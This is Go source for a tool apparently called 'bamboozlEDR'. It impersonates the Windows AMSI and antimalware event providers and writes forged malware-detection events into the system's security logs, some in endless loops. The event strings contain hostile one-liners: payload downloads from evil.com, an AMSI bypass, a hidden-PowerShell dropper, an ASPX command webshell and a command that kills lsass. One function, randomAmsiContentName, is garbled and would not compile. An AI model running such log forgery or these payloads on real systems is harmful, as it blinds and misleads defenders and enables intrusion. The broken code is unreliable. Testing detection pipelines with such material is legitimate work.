`cmd/amsi.go`:

```go
package cmd

import (
	"crypto/md5"
	"crypto/sha256"
	"fmt"
	"log"
	"math/rand"
	"syscall"
	"unsafe"
)

var AmsiProviderGuid = GUID{0x2a576b87, 0x09a7, 0x520e, [8]byte{0xc2, 0x1a, 0x49, 0x42, 0xf0, 0x27, 0x1d, 0x67}}

func WriteRandomAmsiEvent() {
	log.Println("Emitting AMSI events...")

	var regHandle syscall.Handle
	status, _, _ := procEventRegister.Call(uintptr(unsafe.Pointer(&AmsiProviderGuid)), 0, 0, uintptr(unsafe.Pointer(&regHandle)))
	if status != 0 {
		log.Fatalf("Failed to register AMSI provider: %d", status)
	}

	for i := 0; i < 100; i++ {
		var activityId GUID
		hr, _, _ := procCoCreateGuid.Call(uintptr(unsafe.Pointer(&activityId)))
		if hr != 0 {
			log.Fatalf("Failed to create GUID: %d", hr)
		}

		procEventActivityId.Call(3, uintptr(unsafe.Pointer(&activityId)))

		session := uintptr(0x12345678 + uintptr(i)) // Mock session pointer
		scanStatus := uint8(rand.Intn(3))           // 0=clean, 1=malware, 2=suspicious
		scanResult := randomAmsiScanResult()
		appname := randomAmsiAppName()
		contentname := randomAmsiContentName()
		content := randomAmsiContent()
		originalContent := content
		contentFiltered := scanStatus > 0

		LogAmsiEvent(regHandle, session, scanStatus, scanResult, appname, contentname,
			content, originalContent, contentFiltered, i, true)
	}

	procEventUnregister.Call(uintptr(regHandle))
}

func WriteAmsiEvent() {
	fmt.Println("Emitting AMSI event...")

	var regHandle syscall.Handle
	status, _, _ := procEventRegister.Call(uintptr(unsafe.Pointer(&AmsiProviderGuid)), 0, 0, uintptr(unsafe.Pointer(&regHandle)))
	if status != 0 {
		log.Fatalf("Failed to register AMSI provider: %d", status)
	}

	var activityId GUID
	hr, _, _ := procCoCreateGuid.Call(uintptr(unsafe.Pointer(&activityId)))
	if hr != 0 {
		log.Fatalf("Failed to create GUID: %d", hr)
	}

	procEventActivityId.Call(3, uintptr(unsafe.Pointer(&activityId)))

	session := uintptr(0x1337BEEF)
	scanStatus := uint8(1)           // Malware detected
	scanResult := uint32(0x80508023) // AMSI_RESULT_DETECTED
	appname := "PowerShell_C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe_10.0.19041.1_en-US_"
	contentname := "AMSI_UAC_BYPASS_SCRIPT"
	content := "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1'); Bypass-AMSI; Invoke-PewPew"
	originalContent := content
	contentFiltered := true

	LogAmsiEvent(regHandle, session, scanStatus, scanResult, appname, contentname,
		content, originalContent, contentFiltered, 0, true)

	procEventUnregister.Call(uintptr(regHandle))
}

func WriteSuspiciousAmsiEvent() {
	log.Println("Emitting suspicious AMSI events...")

	var regHandle syscall.Handle
	status, _, _ := procEventRegister.Call(uintptr(unsafe.Pointer(&AmsiProviderGuid)), 0, 0, uintptr(unsafe.Pointer(&regHandle)))
	if status != 0 {
		log.Fatalf("Failed to register AMSI provider: %d", status)
	}

	suspiciousScripts := []struct {
		appname     string
		contentname string
		content     string
		scanStatus  uint8
		scanResult  uint32
	}{
		{
			"PowerShell_ISE",
			"AMSI_BYPASS_ATTEMPT",
			"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
			1, 0x80508023,
		},
		{
			"VBScript",
			"MALICIOUS_VBS_SCRIPT",
			"CreateObject(\"WScript.Shell\").Run \"powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://evil.com/payload.ps1'))\"",
			1, 0x80508023,
		},
		{
			"JScript_9.0",
			"JAVASCRIPT_SHELLCODE",
			"var shellcode = \"\\u9090\\u9090\\ucc48\\ue8fc\"; eval(shellcode);",
			1, 0x80508023,
		},
		{
			"OFFICE_VBA",
			"MACRO_DROPPER",
			"Sub Auto_Open(): Shell \"cmd.exe /c powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA\": End Sub",
			1, 0x80508023,
		},
		{
			"DotNet_v4.0.30319",
			"CSHARP_INJECTION",
			"System.Reflection.Assembly.Load(Convert.FromBase64String(\"TVqQAAMAAAAEAAAA//8AALgAAAAAA\"))",
			1, 0x80508023,
		},
		{
			"WMI",
			"WMI_PERSISTENCE",
			"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'",
			2, 0x80508024,
		},
		{
			"PowerShell_7.0",
			"LIVING_OFF_LAND",
			"Get-Process | Where-Object {$_.ProcessName -eq 'lsass'} | ForEach-Object {$_.Kill()}",
			1, 0x80508023,
		},
		{
			"Exchange Server_2019",
			"EXCHANGE_WEBSHELL",
			"<%@ Page Language=\"C#\" %><script runat=\"server\">void Page_Load(object sender, EventArgs e){System.Diagnostics.Process.Start(\"cmd.exe\",\"/c \" + Request.QueryString[\"cmd\"]);}</script>",
			1, 0x80508023,
		},
		{
			"SharePoint Server_2019",
			"SHAREPOINT_EXPLOIT",
			"System.Web.HttpContext.Current.Response.Write(System.IO.File.ReadAllText(\"C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts\"));",
			1, 0x80508023,
		},
	}

	for i, script := range suspiciousScripts {
		var activityId GUID
		hr, _, _ := procCoCreateGuid.Call(uintptr(unsafe.Pointer(&activityId)))
		if hr != 0 {
			log.Fatalf("Failed to create GUID: %d", hr)
		}

		procEventActivityId.Call(3, uintptr(unsafe.Pointer(&activityId)))

		session := uintptr(0x13370000 + uintptr(i))
		contentFiltered := script.scanStatus > 0

		log.Printf("Emitting suspicious AMSI detection: %s - %s", script.appname, script.contentname)

		LogAmsiEvent(regHandle, session, script.scanStatus, script.scanResult, script.appname,
			script.contentname, script.content, script.content, contentFiltered, i, true)
	}

	procEventUnregister.Call(uintptr(regHandle))
}

func LogAmsiEvent(regHandle syscall.Handle, sessionPtr uintptr, scanStatus uint8, scanResult uint32,
	appname, contentname, content, originalContent string, contentFiltered bool, iteration int, verbose bool) {

	var eventDescriptor EventDescriptor
	eventDescriptor.Id = 1101 // AMSI Event ID
	eventDescriptor.Version = 0
	eventDescriptor.Channel = 16 // Operational channel
	eventDescriptor.Level = 4    // Informational
	eventDescriptor.Opcode = 0
	eventDescriptor.Task = 0
	eventDescriptor.Keyword = 0x8000000000000000 // AMSI keyword

	// Convert content to bytes - ensure content is never empty
	if content == "" {
		content = "test content"
	}
	if originalContent == "" {
		originalContent = "test content"
	}

	contentBytes := []byte(content)
	contentSize := uint32(len(contentBytes))
	originalContentBytes := []byte(originalContent)
	originalSize := uint32(len(originalContentBytes))

	// log.Printf("Content length: %d, Original content length: %d", len(contentBytes), len(originalContentBytes))

	// Generate hashes
	contentHash := sha256.Sum256(contentBytes)
	originalHash := md5.Sum(originalContentBytes)

	// Convert boolean to byte
	var contentFilteredByte byte = 0
	if contentFiltered {
		contentFilteredByte = 1
	}

	// Create a simple event data structure matching the manifest order exactly
	eventData := []EventDataDescriptor{
		// session (win:Pointer)
		{Ptr: uint64(uintptr(unsafe.Pointer(&sessionPtr))), Size: uint32(unsafe.Sizeof(sessionPtr))},
		// scanStatus (win:UInt8)
		{Ptr: uint64(uintptr(unsafe.Pointer(&scanStatus))), Size: uint32(unsafe.Sizeof(scanStatus))},
		// scanResult (win:UInt32)
		{Ptr: uint64(uintptr(unsafe.Pointer(&scanResult))), Size: uint32(unsafe.Sizeof(scanResult))},
		// appname (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(appname)))), Size: uint32((len(appname) + 1) * 2)},
		// contentname (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(contentname)))), Size: uint32((len(contentname) + 1) * 2)},
		// contentsize (win:UInt32)
		{Ptr: uint64(uintptr(unsafe.Pointer(&contentSize))), Size: uint32(unsafe.Sizeof(contentSize))},
		// originalsize (win:UInt32)
		{Ptr: uint64(uintptr(unsafe.Pointer(&originalSize))), Size: uint32(unsafe.Sizeof(originalSize))},
		// content (win:Binary)
		{Ptr: uint64(uintptr(unsafe.Pointer(&contentBytes[0]))), Size: contentSize},
		// hash (win:Binary)
		{Ptr: uint64(uintptr(unsafe.Pointer(&contentHash[0]))), Size: uint32(len(contentHash))},
		// contentFiltered (win:Boolean)
		{Ptr: uint64(uintptr(unsafe.Pointer(&contentFilteredByte))), Size: uint32(unsafe.Sizeof(contentFilteredByte))},
		// hashoriginalcontent (win:Binary)
		{Ptr: uint64(uintptr(unsafe.Pointer(&originalHash[0]))), Size: uint32(len(originalHash))},
	}

	if verbose {
		log.Printf("Session: 0x%X", sessionPtr)
		log.Printf("ScanStatus: %d", scanStatus)
		log.Printf("ScanResult: 0x%X", scanResult)
		log.Printf("AppName: %s", appname)
		log.Printf("ContentName: %s", contentname)
		log.Printf("ContentFiltered: %t", contentFiltered)
	}

	status, _, _ := procEventWrite.Call(uintptr(regHandle), uintptr(unsafe.Pointer(&eventDescriptor)), uintptr(len(eventData)), uintptr(unsafe.Pointer(&eventData[0])))
	if status != 0 {
		log.Printf("Failed to write AMSI event: %s", GetWindowsErrorDescription(uint32(status)))
		return
	} else {
		if verbose {
			log.Printf("AMSI Event %d written successfully.", iteration)
		}
	}
}

func randomAmsiAppName() string {
	appNames := []string{
		"PowerShell_C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe_10.0.19041.1_en-US_",
		"PowerShell_ISE",
		"PowerShell_7.0",
		"VBScript",
		"JScript_9.0",
		"JScript_11.0",
		"OFFICE_VBA",
		"DotNet_v4.0.30319",
		"DotNet_v6.0.0",
		"coreclr",
		"WMI",
		"Exchange Server_2016",
		"Exchange Server_2019",
		"SharePoint Server_2016",
		"SharePoint Server_2019",
		"Skype for Business Server",
		"PowerShell_C:\\Program Files\\PowerShell\\7\\pwsh.exe",
		"VBScript_5.8",
	}
	return appNames[rand.Intn(len(appNames))]
}

func randomAmsiContentName() string {

		"DATA_EXFILTRATION",
		"COMMAND_INJECTION",

func randomAmsiContent() string {
	contents := []string{
		"Get-Process | Where-Object {$_.ProcessName -like '*svchost*'}",
		"Invoke-WebRequest -Uri 'http://iminyourlogs.now/payload.ps1' | Invoke-Expression",
		"[System.Convert]::FromBase64String('cG93ZXJzaGVsbA==')",
		"New-Object System.Net.WebClient).DownloadString('http://iminyourlogs.now/script.ps1')",
		"Start-Process -FilePath 'cmd.exe' -ArgumentList '/c whoami'",
		"Get-WmiObject -Class Win32_Process",
		"Invoke-Command -ScriptBlock {Get-LocalUser}",
		"$env:USERNAME + ':' + $env:COMPUTERNAME",
		"(New-Object Net.WebClient).DownloadFile('http://iminyourlogs.nowfile.exe', 'C:\\temp\\file.exe')",
		"Add-Type -TypeDefinition 'using System; public class Test { public static void Main() { Console.WriteLine(\"Hello\"); } }'",
		"CreateObject(\"WScript.Shell\").Run \"iminyourlogsnow.exe\"",
		"document.createElement('script').src = 'http://iminyourlogs.now/script.js'",
		"System.Diagnostics.Process.Start(\"calc.exe\")",
		"SELECT * FROM Win32_Service WHERE State = 'Running'",
		"eval(unescape('%75%6E%65%73%63%61%70%65'))",
		"Shell \"powershell.exe -nop -w hidden -c Write-Host 'iminyourlogsnow'\"",
		"System.Reflection.Assembly.LoadFrom(\"iminyourlogsnow.dll\")",
		"Runtime.getRuntime().exec(\"cmd /c dir\")",
		"import os; os.system('whoami')",
		"exec('print(\"iminyourlogs.now\")')",
	}
	return contents[rand.Intn(len(contents))]
}

func randomAmsiScanResult() uint32 {
	results := []uint32{
		0x00000000, // AMSI_RESULT_CLEAN
		0x00000001, // AMSI_RESULT_NOT_DETECTED
		0x80508023, // AMSI_RESULT_DETECTED
		0x80508024, // AMSI_RESULT_BLOCKED_BY_ADMIN_START
		0x80508025, // AMSI_RESULT_BLOCKED_BY_ADMIN_END
	}
	return results[rand.Intn(len(results))]
}

func WriteInfiniteRandomAmsiEvent() {
	var regHandle syscall.Handle
	status, _, _ := procEventRegister.Call(uintptr(unsafe.Pointer(&AmsiProviderGuid)), 0, 0, uintptr(unsafe.Pointer(&regHandle)))
	if status != 0 {
		log.Printf("Failed to register AMSI provider: %d", status)
		return
	}
	defer procEventUnregister.Call(uintptr(regHandle))

	count := 0
	for {
		if IsEscapePressed() {
			break
		}

		var activityId GUID
		hr, _, _ := procCoCreateGuid.Call(uintptr(unsafe.Pointer(&activityId)))
		if hr != 0 {
			UpdateProviderStats("AMSI-Events", false)
			continue
		}

		procEventActivityId.Call(3, uintptr(unsafe.Pointer(&activityId)))

		session := uintptr(0x12345678 + uintptr(count))
		scanStatus := uint8(rand.Intn(3))
		scanResult := randomAmsiScanResult()
		appname := randomAmsiAppName()
		contentname := randomAmsiContentName()
		content := randomAmsiContent()
		originalContent := content
		contentFiltered := scanStatus > 0

		success := LogAmsiEventQuiet(regHandle, session, scanStatus, scanResult, appname, contentname,
			content, originalContent, contentFiltered, count)
		UpdateProviderStats("AMSI-Events", success)

		count++
	}
}

// LogAmsiEventQuiet is a quiet version of LogAmsiEvent for TUI mode
func LogAmsiEventQuiet(regHandle syscall.Handle, sessionPtr uintptr, scanStatus uint8, scanResult uint32,
	appname, contentname, content, originalContent string, contentFiltered bool, iteration int) bool {

	var eventDescriptor EventDescriptor
	eventDescriptor.Id = 1101
	eventDescriptor.Version = 0
	eventDescriptor.Channel = 16
	eventDescriptor.Level = 2
	eventDescriptor.Opcode = 0
	eventDescriptor.Task = 0
	eventDescriptor.Keyword = 0x8000000000000000

	if originalContent == "" {
		originalContent = "test content"
	}

	contentBytes := []byte(content)
	contentSize := uint32(len(contentBytes))
	originalContentBytes := []byte(originalContent)
	originalSize := uint32(len(originalContentBytes))

	// Generate hashes
	contentHash := sha256.Sum256(contentBytes)
	originalHash := md5.Sum(originalContentBytes)

	// Convert boolean to byte
	var contentFilteredByte byte = 0
	if contentFiltered {
		contentFilteredByte = 1
	}

	// Create event data structure
	eventData := []EventDataDescriptor{
		{Ptr: uint64(uintptr(unsafe.Pointer(&sessionPtr))), Size: uint32(unsafe.Sizeof(sessionPtr))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&scanStatus))), Size: uint32(unsafe.Sizeof(scanStatus))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&scanResult))), Size: uint32(unsafe.Sizeof(scanResult))},
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(appname)))), Size: uint32((len(appname) + 1) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(contentname)))), Size: uint32((len(contentname) + 1) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&contentSize))), Size: uint32(unsafe.Sizeof(contentSize))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&originalSize))), Size: uint32(unsafe.Sizeof(originalSize))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&contentBytes[0]))), Size: contentSize},
		{Ptr: uint64(uintptr(unsafe.Pointer(&contentHash[0]))), Size: uint32(len(contentHash))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&contentFilteredByte))), Size: uint32(unsafe.Sizeof(contentFilteredByte))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&originalHash[0]))), Size: uint32(len(originalHash))},
	}

	status, _, _ := procEventWrite.Call(uintptr(regHandle), uintptr(unsafe.Pointer(&eventDescriptor)), uintptr(len(eventData)), uintptr(unsafe.Pointer(&eventData[0])))
	return status == 0
}

```

`cmd/antimalware.go`:

```go
package cmd

import (
	"fmt"
	"log"
	"math/rand"
	"os"
	"strconv"
	"syscall"
	"time"
	"unsafe"

	"bamboozlEDR/internal"

	"github.com/Microsoft/go-winio/pkg/guid"
)

var ProviderGuid = "751ef305-6c6e-4fed-b847-02ef79d26aef"

// formatGUID converts a GUID struct to a standard string representation
func formatGUID(g *GUID) string {
	return fmt.Sprintf("%08x-%04x-%04x-%02x%02x-%02x%02x%02x%02x%02x%02x",
		g.Data1, g.Data2, g.Data3,
		g.Data4[0], g.Data4[1],
		g.Data4[2], g.Data4[3], g.Data4[4], g.Data4[5], g.Data4[6], g.Data4[7])
}

func WriteAntimalwareEvent(dataType string) {
	providerGuid, err := guid.FromString(ProviderGuid)
	if err != nil {
		log.Printf("Failed to parse provider GUID: %v", err)
		return
	}

	var regHandle syscall.Handle
	ret, _, err := procEventRegister.Call(
		uintptr(unsafe.Pointer(&providerGuid)),
		0,
		0,
		uintptr(unsafe.Pointer(&regHandle)),
	)
	if ret != 0 {
		log.Printf("Failed to register ETW provider: %v (ret: %d)", err, ret)
		log.Printf("This might be because the program is not running as administrator")
		return
	}
	defer procEventUnregister.Call(uintptr(regHandle))

	eventDescriptor := EventDescriptor{
		Id:      48,
		Version: 0,
		Channel: 16,
		Level:   2,
		Opcode:  0,
		Task:    0,
		Keyword: 0x8000000000000000,
	}

	var dataList []internal.ThreatData

	switch dataType {
	case "threat":
		dataList = internal.ThreatDataList
	case "ransom":
		dataList = internal.RansomDataList
	case "benign":
		dataList = internal.BenignDataList
	case "random":
		if len(internal.ThreatDataList) > 0 {
			dataList = []internal.ThreatData{internal.ThreatDataList[rand.Intn(len(internal.ThreatDataList))]}
		} else {
			log.Printf("threatDataList is empty")
			return
		}
	case "randombenign":
		if len(internal.BenignDataList) > 0 {
			dataList = []internal.ThreatData{internal.BenignDataList[rand.Intn(len(internal.BenignDataList))]}
		} else {
			log.Printf("benignDataList is empty")
			return
		}
	default:
		log.Printf("Invalid data type: %v", dataType)
		return
	}

	for _, data := range dataList {

		log.Printf("Writing event for: %s and file: %s", data.GetThreatName(), data.RealPath)

		asSignatureUpdateTime := uint64(133800893050000000)
		asSignatureVersion := "1.421.1111.0"
		avSignatureUpdateTime := uint64(133800893020000000)
		avSignatureVersion := "1.421.1111.0"
		action := uint32(2)
		allowThreatExpirationUTC := uint64(0)
		blockThreatExecSubCategory := uint32(0)
		classification := "0"
		detectionGuid := data.DetectionGuid
		detectionSource := "0x04000000"
		// detectionSource := "0"
		detectionSourceHexInt32, _ := strconv.ParseInt(detectionSource, 0, 32)
		detectionTime := uint64(time.Now().UnixNano())
		engineUpdateTime := uint64(133800893050000000)
		engineVersion := "1.1.24090.11"
		isPassiveMode := false
		md5 := "8ac7a564d633c052ba19d40641410758"
		platformUpdateTime := uint64(133782115743760815)
		platformVersion := "4.18.24090.11"
		processCreationTime := uint64(0)
		processID := uint32(os.Getpid())
		processPath := "Unknown"
		propertyBag := "NULL"
		realPath := data.RealPath
		remediationErrorCode := "0"
		resourceSchema := "file"
		schemaParamAndDataDelimiter := "|"
		schemaParamList := "SchemaParamFilePath"
		schemaParamDataList := data.RealPath
		sha1 := data.Sha1
		sha256 := "707ac8438648d54a2b1ecad0c30befd6a0542787d5f98da94c8cb440a287064b"
		sigSeq := "0247A7DE67260000"
		sigSha := "7dda9e0dc8a38822eacfe08e2a9f99946b65987f"
		threatName := data.GetThreatName()

		// Generate a random GUID using Windows COM API
		var threatTrackingGuid GUID
		hr, _, _ := procCoCreateGuid.Call(uintptr(unsafe.Pointer(&threatTrackingGuid)))
		if hr != 0 {
			log.Printf("Failed to create threat tracking GUID: %d", hr)
			return
		}
		threatTrackingId := formatGUID(&threatTrackingGuid)

		user := "ImInYourLogsNow"
		userSid := "S-1-5-21-3133739513-2472346002-3133701003-501"
		wasExecutingWhileDetected := int32(0)
		isCritical := true

		// Convert strings to UTF16 slices
		asSignatureVersionUTF16 := syscall.StringToUTF16(asSignatureVersion)
		avSignatureVersionUTF16 := syscall.StringToUTF16(avSignatureVersion)
		classificationUTF16 := syscall.StringToUTF16(classification)
		detectionGuidUTF16 := syscall.StringToUTF16(detectionGuid)
		engineVersionUTF16 := syscall.StringToUTF16(engineVersion)
		md5UTF16 := syscall.StringToUTF16(md5)
		platformVersionUTF16 := syscall.StringToUTF16(platformVersion)
		processPathUTF16 := syscall.StringToUTF16(processPath)
		propertyBagUTF16 := syscall.StringToUTF16(propertyBag)
		realPathUTF16 := syscall.StringToUTF16(realPath)
		remediationErrorCodeUTF16 := syscall.StringToUTF16(remediationErrorCode)
		resourceSchemaUTF16 := syscall.StringToUTF16(resourceSchema)
		schemaParamAndDataDelimiterUTF16 := syscall.StringToUTF16(schemaParamAndDataDelimiter)
		schemaParamListUTF16 := syscall.StringToUTF16(schemaParamList)
		schemaParamDataListUTF16 := syscall.StringToUTF16(schemaParamDataList)
		sha1UTF16 := syscall.StringToUTF16(sha1)
		sha256UTF16 := syscall.StringToUTF16(sha256)
		sigSeqUTF16 := syscall.StringToUTF16(sigSeq)
		sigShaUTF16 := syscall.StringToUTF16(sigSha)
		threatNameUTF16 := syscall.StringToUTF16(threatName)
		threatTrackingIdUTF16 := syscall.StringToUTF16(threatTrackingId)
		userUTF16, _ := syscall.UTF16FromString(user)
		userSidUTF16, _ := syscall.UTF16FromString(userSid)

		eventData := []EventDataDescriptor{
			// 1) Sha1 (string)
			{Ptr: uint64(uintptr(unsafe.Pointer(&sha1UTF16[0]))), Size: uint32(len(sha1UTF16) * 2)},

			// 2) Sha256 (string)
			{Ptr: uint64(uintptr(unsafe.Pointer(&sha256UTF16[0]))), Size: uint32(len(sha256UTF16) * 2)},

			// 3) MD5 (string)
			{Ptr: uint64(uintptr(unsafe.Pointer(&md5UTF16[0]))), Size: uint32(len(md5UTF16) * 2)},

			// 4) ProcessID (uint32)
			{Ptr: uint64(uintptr(unsafe.Pointer(&processID))), Size: uint32(unsafe.Sizeof(processID))},

			// 5) ProcessCreationTime (uint64)
			{Ptr: uint64(uintptr(unsafe.Pointer(&processCreationTime))), Size: uint32(unsafe.Sizeof(processCreationTime))},

			// 6) ProcessPath (string)
			{Ptr: uint64(uintptr(unsafe.Pointer(&processPathUTF16[0]))), Size: uint32(len(processPathUTF16) * 2)},

			// 7) ThreatName (string)
			{Ptr: uint64(uintptr(unsafe.Pointer(&threatNameUTF16[0]))), Size: uint32(len(threatNameUTF16) * 2)},

			// 8) RealPath (string)
			{Ptr: uint64(uintptr(unsafe.Pointer(&realPathUTF16[0]))), Size: uint32(len(realPathUTF16) * 2)},

			// 9) WasExecutingWhileDetected (bool)
			{Ptr: uint64(uintptr(unsafe.Pointer(&wasExecutingWhileDetected))), Size: uint32(unsafe.Sizeof(wasExecutingWhileDetected))},

			// 10) Action (uint32)
			{Ptr: uint64(uintptr(unsafe.Pointer(&action))), Size: uint32(unsafe.Sizeof(action))},

			// 11) RemediationErrorCode (string or HexInt32)
			{Ptr: uint64(uintptr(unsafe.Pointer(&remediationErrorCodeUTF16[0]))), Size: uint32(len(remediationErrorCodeUTF16) * 2)},

			// 12) DetectionTime (uint64)
			{Ptr: uint64(uintptr(unsafe.Pointer(&detectionTime))), Size: uint32(unsafe.Sizeof(detectionTime))},

			// 13) User (string)
			{Ptr: uint64(uintptr(unsafe.Pointer(&userUTF16[0]))), Size: uint32(len(userUTF16) * 2)},

			// 14) UserSid (string)
			{Ptr: uint64(uintptr(unsafe.Pointer(&userSidUTF16[0]))), Size: uint32(len(userSidUTF16) * 2)},

			// 15) ResourceSchema (string)
			{Ptr: uint64(uintptr(unsafe.Pointer(&resourceSchemaUTF16[0]))), Size: uint32(len(resourceSchemaUTF16) * 2)},

			// 16) DetectionGuid (string)
			{Ptr: uint64(uintptr(unsafe.Pointer(&detectionGuidUTF16[0]))), Size: uint32(len(detectionGuidUTF16) * 2)},

			// 17) Classification (uint32 or string)
			{Ptr: uint64(uintptr(unsafe.Pointer(&classificationUTF16[0]))), Size: uint32(len(classificationUTF16) * 2)},

			// 18) SchemaParamAndDataDelimiter (string)
			{Ptr: uint64(uintptr(unsafe.Pointer(&schemaParamAndDataDelimiterUTF16[0]))), Size: uint32(len(schemaParamAndDataDelimiterUTF16) * 2)},

			// 19) SchemaParamList (string)
			{Ptr: uint64(uintptr(unsafe.Pointer(&schemaParamListUTF16[0]))), Size: uint32(len(schemaParamListUTF16) * 2)},

			// 20) SchemaParamDataList (string)
			{Ptr: uint64(uintptr(unsafe.Pointer(&schemaParamDataListUTF16[0]))), Size: uint32(len(schemaParamDataListUTF16) * 2)},

			// 21) DetectionSource (uint32 or string)
			// {Ptr: uint64(uintptr(unsafe.Pointer(&detectionSourceUTF16[0]))), Size: uint32(len(detectionSourceUTF16) * 2)},
			{Ptr: uint64(uintptr(unsafe.Pointer(&detectionSourceHexInt32))), Size: uint32(unsafe.Sizeof(detectionSourceHexInt32))},

			// 22) IsPassiveMode (bool)
			{Ptr: uint64(uintptr(unsafe.Pointer(&isPassiveMode))), Size: uint32(unsafe.Sizeof(isPassiveMode))},

			// 23) SigSeq (string or HexInt64)
			{Ptr: uint64(uintptr(unsafe.Pointer(&sigSeqUTF16[0]))), Size: uint32(len(sigSeqUTF16) * 2)},

			// 24) SigSha (string)
			{Ptr: uint64(uintptr(unsafe.Pointer(&sigShaUTF16[0]))), Size: uint32(len(sigShaUTF16) * 2)},

			// 25) isCritical (bool)
			{Ptr: uint64(uintptr(unsafe.Pointer(&isCritical))), Size: uint32(unsafe.Sizeof(isCritical))},

			// 26) ThreatTrackingId (string)
			{Ptr: uint64(uintptr(unsafe.Pointer(&threatTrackingIdUTF16[0]))), Size: uint32(len(threatTrackingIdUTF16) * 2)},

			// 27) PlatformVersion (string)
			{Ptr: uint64(uintptr(unsafe.Pointer(&platformVersionUTF16[0]))), Size: uint32(len(platformVersionUTF16) * 2)},

			// 28) PlatformUpdateTime (uint64)
			{Ptr: uint64(uintptr(unsafe.Pointer(&platformUpdateTime))), Size: uint32(unsafe.Sizeof(platformUpdateTime))},

			// 29) EngineVersion (string)
			{Ptr: uint64(uintptr(unsafe.Pointer(&engineVersionUTF16[0]))), Size: uint32(len(engineVersionUTF16) * 2)},

			// 30) EngineUpdateTime (uint64)
			{Ptr: uint64(uintptr(unsafe.Pointer(&engineUpdateTime))), Size: uint32(unsafe.Sizeof(engineUpdateTime))},

			// 31) ASSignatureVersion (string)
			{Ptr: uint64(uintptr(unsafe.Pointer(&asSignatureVersionUTF16[0]))), Size: uint32(len(asSignatureVersionUTF16) * 2)},

			// 32) ASSignatureUpdateTime (uint64)
			{Ptr: uint64(uintptr(unsafe.Pointer(&asSignatureUpdateTime))), Size: uint32(unsafe.Sizeof(asSignatureUpdateTime))},

			// 33) AVSignatureVersion (string)
			{Ptr: uint64(uintptr(unsafe.Pointer(&avSignatureVersionUTF16[0]))), Size: uint32(len(avSignatureVersionUTF16) * 2)},

			// 34) AVSignatureUpdateTime (uint64)
			{Ptr: uint64(uintptr(unsafe.Pointer(&avSignatureUpdateTime))), Size: uint32(unsafe.Sizeof(avSignatureUpdateTime))},

			// 35) BlockThreatExecSubCategory (uint32)
			{Ptr: uint64(uintptr(unsafe.Pointer(&blockThreatExecSubCategory))), Size: uint32(unsafe.Sizeof(blockThreatExecSubCategory))},

			// 36) PropertyBag (string)
			{Ptr: uint64(uintptr(unsafe.Pointer(&propertyBagUTF16[0]))), Size: uint32(len(propertyBagUTF16) * 2)},

			// 37) AllowThreatExpirationUTC (uint64)
			{Ptr: uint64(uintptr(unsafe.Pointer(&allowThreatExpirationUTC))), Size: uint32(unsafe.Sizeof(allowThreatExpirationUTC))},
		}

		ret, _, err = procEventWrite.Call(
			uintptr(regHandle),
			uintptr(unsafe.Pointer(&eventDescriptor)),
			uintptr(len(eventData)),
			uintptr(unsafe.Pointer(&eventData[0])),
		)
		if ret != 0 {
			log.Printf("Failed to write ETW event: %v", err)
			return
		}
	}

}

func WriteInfiniteAntimalwareEvent(dataType string) {
	providerGuid, err := guid.FromString(ProviderGuid)
	if err != nil {
		log.Printf("Failed to parse provider GUID: %v", err)
		return
	}

	var regHandle syscall.Handle
	ret, _, err := procEventRegister.Call(
		uintptr(unsafe.Pointer(&providerGuid)),
		0,
		0,
		uintptr(unsafe.Pointer(&regHandle)),
	)
	if ret != 0 {
		log.Printf("Failed to register ETW provider: %v", err)
		return
	}
	defer procEventUnregister.Call(uintptr(regHandle))

	eventDescriptor := EventDescriptor{
		Id:      48,
		Version: 0,
		Channel: 16,
		Level:   2,
		Opcode:  0,
		Task:    0,
		Keyword: 0x8000000000000000,
	}

	var dataList []internal.ThreatData
	switch dataType {
	case "threat":
		dataList = internal.ThreatDataList
	case "ransom":
		dataList = internal.RansomDataList
	case "benign":
		dataList = internal.BenignDataList
	default:
		log.Printf("Invalid data type: %v", dataType)
		return
	}

	if len(dataList) == 0 {
		log.Printf("dataList is empty for type: %v", dataType)
		return
	}

	// Determine provider name for statistics
	var providerName string
	if dataType == "threat" {
		providerName = "Antimalware-Threat"
	} else {
		providerName = "Antimalware-Benign"
	}

	// Pre-compute common UTF16 strings
	userUTF16 := GetPrecomputedUTF16("ImInYourLogsNow")
	userSidUTF16 := syscall.StringToUTF16("S-1-5-21-3133739513-2472346002-3133701003-501")
	classificationUTF16 := GetPrecomputedUTF16("0")

	// Pre-compute static values
	wasExecutingWhileDetected := int32(0)
	isCritical := true

	count := 0

	for {
		if IsEscapePressed() {
			break
		}

		// Use random data but avoid expensive operations
		dataIndex := count % len(dataList) // Cycle through data instead of random
		data := dataList[dataIndex]

		// Use GUID pool instead of generating new GUIDs
		activityId := GetNextGuid()
		threatTrackingGuid := GetNextGuid()

		procEventActivityId.Call(3, uintptr(unsafe.Pointer(activityId)))

		// Use simpler, pre-computed values where possible
		detectionGuid := "{" + formatGUID(activityId) + "}"
		threatTrackingId := formatGUID(threatTrackingGuid)
		threatName := data.GetThreatName()

		// Convert only necessary strings to UTF16
		detectionGuidUTF16 := syscall.StringToUTF16(detectionGuid)
		threatTrackingIdUTF16 := syscall.StringToUTF16(threatTrackingId)
		threatNameUTF16 := syscall.StringToUTF16(threatName)
		realPathUTF16 := syscall.StringToUTF16(data.RealPath)
